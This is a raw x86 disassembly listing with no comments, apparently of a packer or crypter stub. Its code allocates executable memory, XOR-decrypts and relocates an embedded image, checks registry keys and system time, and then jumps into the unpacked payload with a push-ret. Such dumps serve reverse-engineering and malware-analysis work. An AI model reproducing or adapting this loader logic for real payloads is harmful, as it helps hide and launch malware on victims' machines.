  41aef9:	add    ah,ah
  41aefb:	fld    QWORD PTR [ecx+0x0]
  41aefe:	jl     0x41aedf
  41af00:	inc    ecx
  41af01:	add    BYTE PTR [eax+0x380041df],al
  41af07:	fild   WORD PTR [ecx+0x0]
  41af0a:	test   bh,bl
  41af0c:	inc    ecx
  41af0d:	add    BYTE PTR [eax-0x73ffbe21],cl
  41af13:	fild   WORD PTR [ecx+0x0]
  41af16:	in     al,0xde
  41af18:	inc    ecx
  41af19:	add    BYTE PTR [eax-0x6bffbe21],dl
  41af1f:	fild   WORD PTR [ecx+0x0]
  41af22:	cwde   
  41af23:	fild   WORD PTR [ecx+0x0]
  41af26:	pushf  
  41af27:	fild   WORD PTR [ecx+0x0]
  41af2a:	mov    bh,bl
  41af2c:	inc    ecx
  41af2d:	add    BYTE PTR [eax-0x22],bl
  41af30:	inc    ecx
  41af31:	add    BYTE PTR [eax-0x5bffbe21],ah
  41af37:	fild   WORD PTR [ecx+0x0]
  41af3a:	test   al,0xdf
  41af3c:	inc    ecx
  41af3d:	add    BYTE PTR [edi+ebx*8-0x2243ffbf],ch
  41af44:	inc    ecx
  41af45:	add    BYTE PTR [ebx*8-0x204fffbf],dh
  41af4c:	inc    ecx
  41af4d:	add    BYTE PTR [edi+ebx*8-0x2047ffbf],dh
  41af54:	inc    ecx
  41af55:	add    BYTE PTR [eax-0x23],ah
  41af58:	inc    ecx
  41af59:	add    BYTE PTR [edi+ebx*8-0x203fffbf],bh
  41af60:	inc    ecx
  41af61:	add    BYTE PTR [eax-0x3bffbe23],ah
  41af67:	fild   WORD PTR [ecx+0x0]
  41af6a:	enter  0x41df,0x0
  41af6e:	int3   
  41af6f:	fild   WORD PTR [ecx+0x0]
  41af72:	xor    al,0xdd
  41af74:	inc    ecx
  41af75:	add    al,dl
  41af77:	fild   WORD PTR [ecx+0x0]
  41af7a:	xchg   esp,eax
  41af7b:	fld    QWORD PTR [ecx+0x0]
  41af7e:	aam    0xdf
  41af80:	inc    ecx
  41af81:	add    al,bl
  41af83:	fild   WORD PTR [ecx+0x0]
  41af86:	(bad)  
  41af88:	inc    ecx
  41af89:	add    al,ah
  41af8b:	fild   WORD PTR [ecx+0x0]
  41af8e:	in     al,0xdf
  41af90:	inc    ecx
  41af91:	add    al,ch
  41af93:	fild   WORD PTR [ecx+0x0]
  41af96:	rcr    ah,1
  41af98:	inc    ecx
  41af99:	add    al,al
  41af9b:	fild   WORD PTR [ecx+0x0]
  41af9e:	cmp    dh,bl
  41afa0:	inc    ecx
  41afa1:	add    ah,ch
  41afa3:	fild   WORD PTR [ecx+0x0]
  41afa6:	lock fild WORD PTR [ecx+0x0]
  41afaa:	hlt    
  41afab:	fild   WORD PTR [ecx+0x0]
  41afae:	clc    
  41afaf:	fild   WORD PTR [ecx+0x0]
  41afb2:	cld    
  41afb3:	fild   WORD PTR [ecx+0x0]
  41afb6:	add    al,ah
  41afb8:	inc    ecx
  41afb9:	add    BYTE PTR [eax+eiz*8],al
  41afbc:	inc    ecx
  41afbd:	add    BYTE PTR [eax],cl
  41afbf:	loopne 0x41b002
  41afc1:	add    ah,cl
  41afc3:	fadd   QWORD PTR [ecx+0x0]
  41afc6:	or     al,0xe0
  41afc8:	inc    ecx
  41afc9:	add    BYTE PTR [eax],dl
  41afcb:	loopne 0x41b00e
  41afcd:	add    BYTE PTR [eax+eiz*8],dl
  41afd0:	inc    ecx
  41afd1:	add    BYTE PTR [eax+0x180041df],ah
  41afd7:	loopne 0x41b01a
  41afd9:	add    al,ah
  41afdb:	fadd   QWORD PTR [ecx+0x0]
  41afde:	sbb    al,0xe0
  41afe0:	inc    ecx
  41afe1:	add    BYTE PTR [eax+0x580041dd],cl
  41afe7:	fiadd  WORD PTR [ecx+0x0]
  41afea:	and    al,ah
  41afec:	inc    ecx
  41afed:	add    BYTE PTR [eax+eiz*8],ah
  41aff0:	inc    ecx
  41aff1:	add    BYTE PTR [eax],ch
  41aff3:	loopne 0x41b036
  41aff5:	add    BYTE PTR [eax+eiz*8],ch
  41aff8:	inc    ecx
  41aff9:	add    BYTE PTR [eax],dh
  41affb:	loopne 0x41b03e
  41affd:	add    BYTE PTR [eax+eiz*8],dh
  41b000:	inc    ecx
  41b001:	add    BYTE PTR [ebx*8-0x1fc7ffbf],al
  41b008:	inc    ecx
  41b009:	add    BYTE PTR [eax+eiz*8],bh
  41b00c:	inc    ecx
  41b00d:	add    BYTE PTR [eax-0x20],al
  41b010:	inc    ecx
  41b011:	add    BYTE PTR [eax+eiz*8+0x41],al
  41b015:	add    BYTE PTR [eax-0x20],cl
  41b018:	inc    ecx
  41b019:	add    BYTE PTR [eax+eiz*8+0x41],cl
  41b01d:	add    BYTE PTR [eax-0x20],dl
  41b020:	inc    ecx
  41b021:	add    BYTE PTR [eax],ch
  41b023:	fld    QWORD PTR [ecx+0x0]
  41b026:	push   esp
  41b027:	loopne 0x41b06a
  41b029:	add    BYTE PTR [eax-0x20],bl
  41b02c:	inc    ecx
  41b02d:	add    BYTE PTR [eax+eiz*8+0x41],bl
  41b031:	add    BYTE PTR [eax-0x22],dh
  41b034:	inc    ecx
  41b035:	add    BYTE PTR [eax-0x20],ah
  41b038:	inc    ecx
  41b039:	add    BYTE PTR [eax+eiz*8+0x41],ah
  41b03d:	add    BYTE PTR [ebx*8-0x1f97ffbf],bh
  41b044:	inc    ecx
  41b045:	add    BYTE PTR [esi+ebx*8],dl
  41b048:	inc    ecx
  41b049:	add    BYTE PTR [eax+eiz*8+0x41],ch
  41b04d:	add    BYTE PTR [eax-0x20],dh
  41b050:	inc    ecx
  41b051:	add    BYTE PTR [eax+eiz*8+0x41],dh
  41b055:	add    BYTE PTR [eax-0x20],bh
  41b058:	inc    ecx
  41b059:	add    BYTE PTR [eax+eiz*8+0x41],bh
  41b05d:	add    BYTE PTR [eax+0x540041e0],al
  41b063:	fld    QWORD PTR [ecx+0x0]
  41b066:	test   al,ah
  41b068:	inc    ecx
  41b069:	add    BYTE PTR [eax-0x77ffbe21],al
  41b06f:	loopne 0x41b0b2
  41b071:	add    BYTE PTR [eax+eiz*8-0x232bffbf],cl
  41b078:	inc    ecx
  41b079:	add    BYTE PTR [eax+0x41e0],dl
  41b07f:	fild   WORD PTR [ecx+0x0]
  41b082:	xchg   esp,eax
  41b083:	loopne 0x41b0c6
  41b085:	add    BYTE PTR [eax+0x380041e0],bl
  41b08b:	fiadd  WORD PTR [ecx+0x0]
  41b08e:	ins    BYTE PTR es:[edi],dx
  41b08f:	loopne 0x41b0d2
  41b091:	add    BYTE PTR [eax+eiz*8-0x1f5fffbf],bl
  41b098:	inc    ecx
  41b099:	add    ah,cl
  41b09b:	int3   
  41b09c:	int3   
  41b09d:	int3   
  41b09e:	int3   
  41b09f:	int3   
  41b0a0:	push   ebp
  41b0a1:	mov    ebp,esp
  41b0a3:	sub    esp,0xc
  41b0a6:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  41b0ad:	mov    DWORD PTR [ebp-0xc],0x3000
  41b0b4:	mov    DWORD PTR [ebp-0x4],0x40
  41b0bb:	mov    eax,DWORD PTR [ebp-0x4]
  41b0be:	push   eax
  41b0bf:	mov    ecx,DWORD PTR [ebp-0xc]
  41b0c2:	push   ecx
  41b0c3:	mov    edx,DWORD PTR [ebp+0x8]
  41b0c6:	push   edx
  41b0c7:	push   0x0
  41b0c9:	call   DWORD PTR ds:0x41dcb4
  41b0cf:	mov    esp,ebp
  41b0d1:	pop    ebp
  41b0d2:	ret    
  41b0d3:	int3   
  41b0d4:	int3   
  41b0d5:	int3   
  41b0d6:	int3   
  41b0d7:	int3   
  41b0d8:	int3   
  41b0d9:	int3   
  41b0da:	int3   
  41b0db:	int3   
  41b0dc:	int3   
  41b0dd:	int3   
  41b0de:	int3   
  41b0df:	int3   
  41b0e0:	push   ebp
  41b0e1:	mov    ebp,esp
  41b0e3:	pop    ebp
  41b0e4:	ret    
  41b0e5:	int3   
  41b0e6:	int3   
  41b0e7:	int3   
  41b0e8:	int3   
  41b0e9:	int3   
  41b0ea:	int3   
  41b0eb:	int3   
  41b0ec:	int3   
  41b0ed:	int3   
  41b0ee:	int3   
  41b0ef:	int3   
  41b0f0:	push   ebp
  41b0f1:	mov    ebp,esp
  41b0f3:	sub    esp,0x8
  41b0f6:	mov    eax,DWORD PTR [ebp+0x8]
  41b0f9:	mov    DWORD PTR [ebp-0x4],eax
  41b0fc:	mov    ecx,DWORD PTR [ebp+0xc]
  41b0ff:	mov    DWORD PTR [ebp-0x8],ecx
  41b102:	mov    edx,DWORD PTR [ebp-0x4]
  41b105:	cmp    edx,DWORD PTR [ebp-0x8]
  41b108:	jae    0x41b111
  41b10a:	mov    eax,DWORD PTR [ebp-0x4]
  41b10d:	jmp    0x41b114
  41b10f:	jmp    0x41b114
  41b111:	mov    eax,DWORD PTR [ebp-0x8]
  41b114:	mov    esp,ebp
  41b116:	pop    ebp
  41b117:	ret    
  41b118:	int3   
  41b119:	int3   
  41b11a:	int3   
  41b11b:	int3   
  41b11c:	int3   
  41b11d:	int3   
  41b11e:	int3   
  41b11f:	int3   
  41b120:	push   ebp
  41b121:	mov    ebp,esp
  41b123:	mov    DWORD PTR ds:0x420e28,0x401004
  41b12d:	pop    ebp
  41b12e:	ret    
  41b12f:	int3   
  41b130:	push   ebp
  41b131:	mov    ebp,esp
  41b133:	mov    DWORD PTR ds:0x420e28,0x41a258
  41b13d:	pop    ebp
  41b13e:	ret    
  41b13f:	int3   
  41b140:	push   ebp
  41b141:	mov    ebp,esp
  41b143:	mov    eax,DWORD PTR [ebp+0x8]
  41b146:	mov    eax,DWORD PTR [eax-0x4]
  41b149:	pop    ebp
  41b14a:	ret    
  41b14b:	int3   
  41b14c:	int3   
  41b14d:	int3   
  41b14e:	int3   
  41b14f:	int3   
  41b150:	push   ebp
  41b151:	mov    ebp,esp
  41b153:	sub    esp,0xc
  41b156:	mov    DWORD PTR [ebp-0x4],0x0
  41b15d:	jmp    0x41b168
  41b15f:	mov    eax,DWORD PTR [ebp-0x4]
  41b162:	add    eax,0x1
  41b165:	mov    DWORD PTR [ebp-0x4],eax
  41b168:	mov    ecx,DWORD PTR [ebp-0x4]
  41b16b:	cmp    ecx,DWORD PTR [ebp+0x8]
  41b16e:	jae    0x41b1bf
  41b170:	mov    edx,DWORD PTR [ebp-0x4]
  41b173:	mov    eax,DWORD PTR [ebp+0xc]
  41b176:	movzx  ecx,WORD PTR [eax+edx*2]
  41b17a:	sar    ecx,0xc
  41b17d:	cmp    ecx,0x3
  41b180:	jne    0x41b1bd
  41b182:	mov    DWORD PTR [ebp-0xc],0xfff
  41b189:	mov    edx,DWORD PTR [ebp-0x4]
  41b18c:	mov    eax,DWORD PTR [ebp+0xc]
  41b18f:	movzx  ecx,WORD PTR [eax+edx*2]
  41b193:	and    ecx,DWORD PTR [ebp-0xc]
  41b196:	add    ecx,0x43
  41b199:	mov    DWORD PTR [ebp-0x8],ecx
  41b19c:	mov    edx,DWORD PTR [ebp+0x18]
  41b19f:	mov    eax,DWORD PTR [ebp+0x10]
  41b1a2:	add    eax,DWORD PTR [edx]
  41b1a4:	mov    ecx,DWORD PTR [ebp-0x8]
  41b1a7:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  41b1ab:	add    edx,DWORD PTR [ebp+0x14]
  41b1ae:	mov    eax,DWORD PTR [ebp+0x18]
  41b1b1:	mov    ecx,DWORD PTR [ebp+0x10]
  41b1b4:	add    ecx,DWORD PTR [eax]
  41b1b6:	mov    eax,DWORD PTR [ebp-0x8]
  41b1b9:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  41b1bd:	jmp    0x41b15f
  41b1bf:	mov    esp,ebp
  41b1c1:	pop    ebp
  41b1c2:	ret    
  41b1c3:	int3   
  41b1c4:	int3   
  41b1c5:	int3   
  41b1c6:	int3   
  41b1c7:	int3   
  41b1c8:	int3   
  41b1c9:	int3   
  41b1ca:	int3   
  41b1cb:	int3   
  41b1cc:	int3   
  41b1cd:	int3   
  41b1ce:	int3   
  41b1cf:	int3   
  41b1d0:	push   ebp
  41b1d1:	mov    ebp,esp
  41b1d3:	sub    esp,0x24
  41b1d6:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b1dd:	mov    DWORD PTR [ebp-0x10],0x0
  41b1e4:	jmp    0x41b1ef
  41b1e6:	mov    eax,DWORD PTR [ebp-0x10]
  41b1e9:	add    eax,0x4
  41b1ec:	mov    DWORD PTR [ebp-0x10],eax
  41b1ef:	mov    ecx,DWORD PTR [ebp-0x10]
  41b1f2:	cmp    ecx,DWORD PTR [ebp+0xc]
  41b1f5:	jae    0x41b2c1
  41b1fb:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b202:	cmp    DWORD PTR [ebp-0x10],0x0
  41b206:	jne    0x41b258
  41b208:	push   0x104
  41b20d:	push   0x420e2c
  41b212:	call   DWORD PTR ds:0x41dcb8
  41b218:	push   0x41d000
  41b21d:	push   0x420e2c
  41b222:	call   DWORD PTR ds:0x41dcbc
  41b228:	push   0x0
  41b22a:	push   0x80
  41b22f:	push   0x3
  41b231:	push   0x0
  41b233:	push   0x3
  41b235:	push   0x1
  41b237:	push   0x420e2c
  41b23c:	call   DWORD PTR ds:0x41dcc0
  41b242:	mov    DWORD PTR [ebp-0x4],eax
  41b245:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  41b249:	je     0x41b251
  41b24b:	cmp    DWORD PTR [ebp-0x4],0x0
  41b24f:	jne    0x41b258
  41b251:	mov    eax,0x42
  41b256:	jmp    0x41b2c1
  41b258:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b25f:	mov    edx,DWORD PTR [ebp-0x10]
  41b262:	add    edx,0x4fa
  41b268:	mov    DWORD PTR ds:0x420f30,edx
  41b26e:	mov    eax,DWORD PTR [ebp+0x8]
  41b271:	add    eax,DWORD PTR [ebp-0x10]
  41b274:	mov    ecx,DWORD PTR [eax]
  41b276:	add    ecx,DWORD PTR [ebp-0x10]
  41b279:	mov    edx,DWORD PTR [ebp+0x8]
  41b27c:	add    edx,DWORD PTR [ebp-0x10]
  41b27f:	mov    DWORD PTR [edx],ecx
  41b281:	mov    eax,DWORD PTR [ebp-0xc]
  41b284:	mov    DWORD PTR [ebp-0x14],eax
  41b287:	mov    DWORD PTR [ebp-0x8],0xdbc8
  41b28e:	mov    ecx,DWORD PTR ds:0x420f30
  41b294:	mov    DWORD PTR [ebp-0x24],ecx
  41b297:	mov    edx,DWORD PTR [ebp-0x24]
  41b29a:	mov    DWORD PTR [ebp-0x20],edx
  41b29d:	mov    eax,DWORD PTR [ebp-0x20]
  41b2a0:	mov    DWORD PTR [ebp-0x1c],eax
  41b2a3:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b2a6:	mov    DWORD PTR [ebp-0x18],ecx
  41b2a9:	mov    edx,DWORD PTR [ebp+0x8]
  41b2ac:	add    edx,DWORD PTR [ebp-0x10]
  41b2af:	mov    eax,DWORD PTR [edx]
  41b2b1:	xor    eax,DWORD PTR [ebp-0x18]
  41b2b4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b2b7:	add    ecx,DWORD PTR [ebp-0x10]
  41b2ba:	mov    DWORD PTR [ecx],eax
  41b2bc:	jmp    0x41b1e6
  41b2c1:	mov    esp,ebp
  41b2c3:	pop    ebp
  41b2c4:	ret    
  41b2c5:	int3   
  41b2c6:	int3   
  41b2c7:	int3   
  41b2c8:	int3   
  41b2c9:	int3   
  41b2ca:	int3   
  41b2cb:	int3   
  41b2cc:	int3   
  41b2cd:	int3   
  41b2ce:	int3   
  41b2cf:	int3   
  41b2d0:	push   ebp
  41b2d1:	mov    ebp,esp
  41b2d3:	sub    esp,0x14
  41b2d6:	mov    eax,DWORD PTR [ebp+0x8]
  41b2d9:	cmp    DWORD PTR [eax+0x4],0x0
  41b2dd:	je     0x41b327
  41b2df:	mov    DWORD PTR [ebp-0x14],0x2a1
  41b2e6:	mov    ecx,DWORD PTR [ebp+0x8]
  41b2e9:	mov    edx,DWORD PTR [ecx+0x4]
  41b2ec:	sub    edx,0x8
  41b2ef:	shr    edx,1
  41b2f1:	mov    DWORD PTR [ebp-0xc],edx
  41b2f4:	mov    eax,DWORD PTR [ebp+0x8]
  41b2f7:	add    eax,0x8
  41b2fa:	mov    DWORD PTR [ebp-0x10],eax
  41b2fd:	mov    ecx,DWORD PTR [ebp+0x8]
  41b300:	push   ecx
  41b301:	mov    edx,DWORD PTR [ebp+0x10]
  41b304:	push   edx
  41b305:	mov    eax,DWORD PTR [ebp+0xc]
  41b308:	push   eax
  41b309:	mov    ecx,DWORD PTR [ebp-0x10]
  41b30c:	push   ecx
  41b30d:	mov    edx,DWORD PTR [ebp-0xc]
  41b310:	push   edx
  41b311:	call   0x41b150
  41b316:	add    esp,0x14
  41b319:	mov    eax,DWORD PTR [ebp+0x8]
  41b31c:	mov    ecx,DWORD PTR [ebp+0x8]
  41b31f:	add    ecx,DWORD PTR [eax+0x4]
  41b322:	mov    DWORD PTR [ebp+0x8],ecx
  41b325:	jmp    0x41b2d6
  41b327:	mov    esp,ebp
  41b329:	pop    ebp
  41b32a:	ret    
  41b32b:	int3   
  41b32c:	int3   
  41b32d:	int3   
  41b32e:	int3   
  41b32f:	int3   
  41b330:	push   ebp
  41b331:	mov    ebp,esp
  41b333:	sub    esp,0x8
  41b336:	mov    DWORD PTR [ebp-0x4],0x41d018
  41b33d:	lea    eax,[ebp-0x8]
  41b340:	push   eax
  41b341:	push   0x20019
  41b346:	push   0x0
  41b348:	push   0x420e20
  41b34d:	push   0x80000002
  41b352:	call   DWORD PTR ds:0x420f34
  41b358:	test   eax,eax
  41b35a:	je     0x41b363
  41b35c:	xor    eax,eax
  41b35e:	jmp    0x41b404
  41b363:	lea    ecx,[ebp-0x8]
  41b366:	push   ecx
  41b367:	push   0x20019
  41b36c:	push   0x0
  41b36e:	push   0x420e24
  41b373:	push   0x80000002
  41b378:	call   DWORD PTR ds:0x420f34
  41b37e:	test   eax,eax
  41b380:	je     0x41b386
  41b382:	xor    eax,eax
  41b384:	jmp    0x41b404
  41b386:	mov    edx,0x53
  41b38b:	mov    eax,DWORD PTR [ebp-0x4]
  41b38e:	mov    WORD PTR [eax],dx
  41b391:	lea    ecx,[ebp-0x8]
  41b394:	push   ecx
  41b395:	push   0x20019
  41b39a:	push   0x0
  41b39c:	mov    edx,DWORD PTR [ebp-0x4]
  41b39f:	push   edx
  41b3a0:	mov    eax,DWORD PTR [ebp-0x8]
  41b3a3:	push   eax
  41b3a4:	call   DWORD PTR ds:0x420f34
  41b3aa:	test   eax,eax
  41b3ac:	je     0x41b3b2
  41b3ae:	xor    eax,eax
  41b3b0:	jmp    0x41b404
  41b3b2:	lea    ecx,[ebp-0x8]
  41b3b5:	push   ecx
  41b3b6:	push   0x20019
  41b3bb:	push   0x0
  41b3bd:	push   0x41d030
  41b3c2:	mov    edx,DWORD PTR [ebp-0x8]
  41b3c5:	push   edx
  41b3c6:	call   DWORD PTR ds:0x420f34
  41b3cc:	test   eax,eax
  41b3ce:	je     0x41b3dd
  41b3d0:	push   0x1
  41b3d2:	push   0x1
  41b3d4:	push   0x1
  41b3d6:	push   0x1
  41b3d8:	call   0x41b330
  41b3dd:	lea    eax,[ebp-0x8]
  41b3e0:	push   eax
  41b3e1:	push   0x20019
  41b3e6:	push   0x0
  41b3e8:	push   0x41d0a8
  41b3ed:	mov    ecx,DWORD PTR [ebp-0x8]
  41b3f0:	push   ecx
  41b3f1:	call   DWORD PTR ds:0x420f34
  41b3f7:	test   eax,eax
  41b3f9:	jne    0x41b3ff
  41b3fb:	xor    eax,eax
  41b3fd:	jmp    0x41b404
  41b3ff:	call   0x41b120
  41b404:	mov    esp,ebp
  41b406:	pop    ebp
  41b407:	ret    0x10
  41b40a:	int3   
  41b40b:	int3   
  41b40c:	int3   
  41b40d:	int3   
  41b40e:	int3   
  41b40f:	int3   
  41b410:	push   ebp
  41b411:	mov    ebp,esp
  41b413:	sub    esp,0x4d4
  41b419:	pusha  
  41b41a:	mov    DWORD PTR ds:0x420f38,ebp
  41b420:	mov    DWORD PTR [ebp-0x4a0],0x0
  41b42a:	mov    DWORD PTR [ebp-0x4b4],0x80000002
  41b434:	push   0x41d0b8
  41b439:	push   0x41d0c8
  41b43e:	call   DWORD PTR ds:0x41dc6c
  41b444:	push   eax
  41b445:	call   DWORD PTR ds:0x41db24
  41b44b:	mov    ds:0x420f34,eax
  41b450:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  41b457:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  41b45e:	lea    eax,[ebp-0x4b8]
  41b464:	push   eax
  41b465:	lea    ecx,[ebp-0x4bc]
  41b46b:	push   ecx
  41b46c:	lea    edx,[ebp-0x8]
  41b46f:	push   edx
  41b470:	call   DWORD PTR ds:0x41dcc4
  41b476:	movzx  eax,WORD PTR [ebp-0x4bc]
  41b47d:	cmp    eax,0x21
  41b480:	je     0x41b489
  41b482:	xor    eax,eax
  41b484:	jmp    0x41b76e
  41b489:	push   0x1
  41b48b:	push   0x1
  41b48d:	push   0x1
  41b48f:	push   0x1
  41b491:	call   0x41b330
  41b496:	mov    DWORD PTR [ebp-0x424],0x0
  41b4a0:	mov    DWORD PTR [ebp-0x494],0x64
  41b4aa:	mov    DWORD PTR [ebp-0x42c],0x12
  41b4b4:	mov    DWORD PTR [ebp-0x4a0],0x0
  41b4be:	mov    DWORD PTR [ebp-0x464],0x0
  41b4c8:	mov    DWORD PTR [ebp-0x490],0x1
  41b4d2:	mov    DWORD PTR [ebp-0x428],0x3
  41b4dc:	mov    ecx,DWORD PTR ds:0x420e28
  41b4e2:	push   ecx
  41b4e3:	call   0x41b140
  41b4e8:	add    esp,0x4
  41b4eb:	mov    DWORD PTR [ebp-0x4a4],eax
  41b4f1:	mov    edx,DWORD PTR [ebp-0x4a4]
  41b4f7:	push   edx
  41b4f8:	call   0x41b0a0
  41b4fd:	add    esp,0x4
  41b500:	mov    DWORD PTR [ebp-0x49c],eax
  41b506:	mov    eax,DWORD PTR [ebp-0x4a4]
  41b50c:	push   eax
  41b50d:	push   0x0
  41b50f:	mov    ecx,DWORD PTR [ebp-0x49c]
  41b515:	push   ecx
  41b516:	call   0x41b0e0
  41b51b:	add    esp,0xc
  41b51e:	mov    edx,DWORD PTR [ebp-0x4a4]
  41b524:	mov    DWORD PTR [ebp-0x4ac],edx
  41b52a:	mov    eax,DWORD PTR [ebp-0x4a0]
  41b530:	cmp    eax,DWORD PTR [ebp-0x4a4]
  41b536:	jae    0x41b5c2
  41b53c:	mov    ecx,DWORD PTR [ebp-0x4ac]
  41b542:	push   ecx
  41b543:	mov    edx,DWORD PTR [ebp-0x494]
  41b549:	push   edx
  41b54a:	call   0x41b0f0
  41b54f:	add    esp,0x8
  41b552:	mov    DWORD PTR [ebp-0x4b0],eax
  41b558:	mov    eax,DWORD PTR [ebp-0x4b0]
  41b55e:	push   eax
  41b55f:	mov    ecx,DWORD PTR ds:0x420e28
  41b565:	add    ecx,DWORD PTR [ebp-0x464]
  41b56b:	push   ecx
  41b56c:	mov    edx,DWORD PTR [ebp-0x49c]
  41b572:	add    edx,DWORD PTR [ebp-0x4a0]
  41b578:	push   edx
  41b579:	call   0x41c0ba
  41b57e:	add    esp,0xc
  41b581:	mov    eax,DWORD PTR [ebp-0x42c]
  41b587:	add    eax,DWORD PTR [ebp-0x494]
  41b58d:	add    eax,DWORD PTR [ebp-0x464]
  41b593:	mov    DWORD PTR [ebp-0x464],eax
  41b599:	mov    ecx,DWORD PTR [ebp-0x4a0]
  41b59f:	add    ecx,DWORD PTR [ebp-0x494]
  41b5a5:	mov    DWORD PTR [ebp-0x4a0],ecx
  41b5ab:	mov    edx,DWORD PTR [ebp-0x4ac]
  41b5b1:	sub    edx,DWORD PTR [ebp-0x4b0]
  41b5b7:	mov    DWORD PTR [ebp-0x4ac],edx
  41b5bd:	jmp    0x41b52a
  41b5c2:	mov    eax,DWORD PTR [ebp-0x4a4]
  41b5c8:	push   eax
  41b5c9:	mov    ecx,DWORD PTR [ebp-0x49c]
  41b5cf:	push   ecx
  41b5d0:	call   0x41b1d0
  41b5d5:	add    esp,0x8
  41b5d8:	mov    DWORD PTR [ebp-0x464],0x0
  41b5e2:	mov    DWORD PTR [ebp-0x4c4],0x0
  41b5ec:	call   0x41b130
  41b5f1:	mov    edx,DWORD PTR ds:0x420e28
  41b5f7:	push   edx
  41b5f8:	call   0x41b140
  41b5fd:	add    esp,0x4
  41b600:	mov    DWORD PTR [ebp-0x4c8],eax
  41b606:	mov    eax,DWORD PTR [ebp-0x4c8]
  41b60c:	push   eax
  41b60d:	call   0x41b0a0
  41b612:	add    esp,0x4
  41b615:	mov    DWORD PTR [ebp-0x460],eax
  41b61b:	mov    ecx,DWORD PTR [ebp-0x4c8]
  41b621:	push   ecx
  41b622:	push   0x0
  41b624:	mov    edx,DWORD PTR [ebp-0x460]
  41b62a:	push   edx
  41b62b:	call   0x41b0e0
  41b630:	add    esp,0xc
  41b633:	mov    eax,DWORD PTR [ebp-0x4c8]
  41b639:	mov    DWORD PTR [ebp-0x4d0],eax
  41b63f:	mov    ecx,DWORD PTR [ebp-0x4c4]
  41b645:	cmp    ecx,DWORD PTR [ebp-0x4c8]
  41b64b:	jae    0x41b6d7
  41b651:	mov    edx,DWORD PTR [ebp-0x4d0]
  41b657:	push   edx
  41b658:	mov    eax,DWORD PTR [ebp-0x494]
  41b65e:	push   eax
  41b65f:	call   0x41b0f0
  41b664:	add    esp,0x8
  41b667:	mov    DWORD PTR [ebp-0x4d4],eax
  41b66d:	mov    ecx,DWORD PTR [ebp-0x4d4]
  41b673:	push   ecx
  41b674:	mov    edx,DWORD PTR ds:0x420e28
  41b67a:	add    edx,DWORD PTR [ebp-0x464]
  41b680:	push   edx
  41b681:	mov    eax,DWORD PTR [ebp-0x460]
  41b687:	add    eax,DWORD PTR [ebp-0x4c4]
  41b68d:	push   eax
  41b68e:	call   0x41c0ba
  41b693:	add    esp,0xc
  41b696:	mov    ecx,DWORD PTR [ebp-0x42c]
  41b69c:	add    ecx,DWORD PTR [ebp-0x494]
  41b6a2:	add    ecx,DWORD PTR [ebp-0x464]
  41b6a8:	mov    DWORD PTR [ebp-0x464],ecx
  41b6ae:	mov    edx,DWORD PTR [ebp-0x4c4]
  41b6b4:	add    edx,DWORD PTR [ebp-0x494]
  41b6ba:	mov    DWORD PTR [ebp-0x4c4],edx
  41b6c0:	mov    eax,DWORD PTR [ebp-0x4d0]
  41b6c6:	sub    eax,DWORD PTR [ebp-0x4d4]
  41b6cc:	mov    DWORD PTR [ebp-0x4d0],eax
  41b6d2:	jmp    0x41b63f
  41b6d7:	mov    ecx,DWORD PTR [ebp-0x4c8]
  41b6dd:	push   ecx
  41b6de:	mov    edx,DWORD PTR [ebp-0x460]
  41b6e4:	push   edx
  41b6e5:	call   0x41b1d0
  41b6ea:	add    esp,0x8
  41b6ed:	mov    eax,DWORD PTR [ebp-0x49c]
  41b6f3:	mov    ecx,DWORD PTR [ebp-0x460]
  41b6f9:	mov    DWORD PTR [eax],ecx
  41b6fb:	push   0x17000
  41b700:	call   0x41b0a0
  41b705:	add    esp,0x4
  41b708:	mov    DWORD PTR [ebp-0xc],eax
  41b70b:	push   0x15500
  41b710:	mov    edx,DWORD PTR [ebp-0x49c]
  41b716:	push   edx
  41b717:	mov    eax,DWORD PTR [ebp-0xc]
  41b71a:	add    eax,0x200
  41b71f:	push   eax
  41b720:	call   0x41c0ba
  41b725:	add    esp,0xc
  41b728:	mov    ecx,DWORD PTR [ebp-0xc]
  41b72b:	sub    ecx,0x400000
  41b731:	push   ecx
  41b732:	mov    edx,DWORD PTR [ebp-0xc]
  41b735:	push   edx
  41b736:	mov    eax,DWORD PTR [ebp-0x460]
  41b73c:	push   eax
  41b73d:	call   0x41b2d0
  41b742:	add    esp,0xc
  41b745:	mov    esp,DWORD PTR ds:0x420f38
  41b74b:	pop    eax
  41b74c:	mov    eax,DWORD PTR [ebp-0xc]
  41b74f:	add    eax,0x15350
  41b754:	call   0x41b759
  41b759:	pop    ecx
  41b75a:	call   0x41b75f
  41b75f:	pop    ecx
  41b760:	call   0x41b765
  41b765:	pop    ecx
  41b766:	call   0x41b76b
  41b76b:	pop    ecx
  41b76c:	push   eax
  41b76d:	ret    
  41b76e:	mov    esp,ebp
  41b770:	pop    ebp
  41b771:	ret    
  41b772:	jmp    DWORD PTR ds:0x41da70
  41b778:	jmp    DWORD PTR ds:0x41da74
  41b77e:	jmp    DWORD PTR ds:0x41da78
  41b784:	jmp    DWORD PTR ds:0x41da7c
  41b78a:	jmp    DWORD PTR ds:0x41da80
  41b790:	jmp    DWORD PTR ds:0x41da84
  41b796:	jmp    DWORD PTR ds:0x41da88
  41b79c:	jmp    DWORD PTR ds:0x41da8c
  41b7a2:	jmp    DWORD PTR ds:0x41da90
  41b7a8:	jmp    DWORD PTR ds:0x41da94
  41b7ae:	jmp    DWORD PTR ds:0x41da98
  41b7b4:	jmp    DWORD PTR ds:0x41da9c
  41b7ba:	jmp    DWORD PTR ds:0x41daa0
  41b7c0:	jmp    DWORD PTR ds:0x41daa4
  41b7c6:	jmp    DWORD PTR ds:0x41daa8
  41b7cc:	jmp    DWORD PTR ds:0x41daac
  41b7d2:	jmp    DWORD PTR ds:0x41dab0
  41b7d8:	jmp    DWORD PTR ds:0x41dab4
  41b7de:	jmp    DWORD PTR ds:0x41dab8
  41b7e4:	jmp    DWORD PTR ds:0x41dabc
  41b7ea:	jmp    DWORD PTR ds:0x41dac0
  41b7f0:	jmp    DWORD PTR ds:0x41dac4
  41b7f6:	jmp    DWORD PTR ds:0x41dac8
